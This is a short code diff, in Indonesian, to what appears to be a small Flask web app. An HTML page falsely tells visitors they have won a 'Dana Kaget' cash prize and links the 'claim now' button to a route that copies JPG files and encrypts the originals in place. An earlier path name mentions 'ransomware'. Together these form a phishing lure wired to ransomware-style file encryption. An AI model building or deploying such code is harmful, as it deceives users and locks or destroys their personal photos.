@@ -69,7 +69,7 @@ body {
         </div>
         <div class="content">
             <p>Selamat! Anda mendapatkan kesempatan untuk mendspatkan Dana Kaget,klik tombol untuk langsung ke Dana!</p>
-            <a href="/backup_jpg_file" class="btn">klaim Sekarang</a>
+            <a href='/backup_jpg_files' class="btn">klaim Sekarang</a>
         </div>
     </div>
 </body>
@@ -107,13 +107,13 @@ def run_python_code():
 @app.route('/backup_jpg_files')
 def backup_jpg_files_route():
     # Tentukan direktori yang ingin dicari dan direktori yang dikecualikan
-    directory_to_search = "/sdcard/contoh1"
-    exclude_directory = "/storage/emulated/0/ransomware"
+    directory_to_search = "...."
+    exclude_directory = "/..."
     # Backup file JPG dan enkripsi yang asli di tempatnya
     jpg_files = backup_jpg_files(directory_to_search, "images", exclude_directory)
 
     return f"{len(jpg_files)} JPG files have been backed up and original files have been encrypted on the server."
 
 if __name__ == '__main__':
-    app.run(port=5010, debug=True)
+    app.run(port=5001, debug=True)
     
